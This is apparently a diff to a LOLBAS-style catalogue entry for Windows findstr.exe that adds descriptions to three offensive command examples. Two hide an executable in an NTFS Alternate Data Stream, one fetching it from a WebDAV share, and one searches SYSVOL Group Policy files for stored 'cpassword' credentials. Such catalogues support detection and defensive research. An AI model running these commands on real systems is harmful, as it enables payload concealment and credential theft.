@@ -6,11 +6,11 @@ Created: '2018-05-25'
 Categories: []
 Commands:
   - Command: findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe
-    Description: ''
+    Description: 'Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.'
   - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
-    Description: ''
+    Description: 'Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.'
   - Command: findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
-    Description: ''
+    Description: 'Search for stored password in Group Policy files stored on SYSVOL.'
 Full Path:
   - c:\windows\system32\findstr.exe
   - c:\windows\sysWOW64\findstr.exe
